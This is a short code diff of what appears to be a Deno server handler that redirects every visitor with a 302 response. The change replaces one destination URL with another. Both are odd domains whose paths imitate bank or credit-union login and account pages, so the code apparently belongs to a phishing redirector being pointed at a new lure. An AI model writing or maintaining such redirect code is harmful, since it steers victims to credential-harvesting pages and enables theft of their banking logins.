@@ -5,7 +5,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://asegrerev.icu/westreet/login_/",
+      Location: "https://myrexvvcsuonline.onl/memberfirst/acct/",
     },
   });
 });
